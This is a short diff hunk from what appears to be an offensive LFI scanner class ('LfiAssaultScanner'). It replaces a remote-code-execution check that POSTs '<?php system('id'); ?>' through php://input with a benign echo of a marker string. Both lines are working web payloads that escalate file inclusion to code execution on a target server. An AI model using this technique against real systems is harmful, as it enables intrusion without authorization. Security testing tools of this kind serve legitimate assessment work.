@@ -203,9 +203,9 @@ class LfiAssaultScanner:
                             escalation_type = "Log Poisoning Candidate"
                         
                         if is_php_input:
-                            # Attempt RCE verification via POST
-                            r_rce = session.post(final_url, data="<?php system('id'); ?>", timeout=5, verify=False)
-                            if "uid=" in r_rce.text:
+                            # Attempt RCE verification via POST (Safe Proof)
+                            r_rce = session.post(final_url, data="<?php echo 'REDOPS_LFI_PROOF'; ?>", timeout=5, verify=False)
+                            if "REDOPS_LFI_PROOF" in r_rce.text:
                                 success = True
                                 escalation_type = "RCE via php://input"
                         
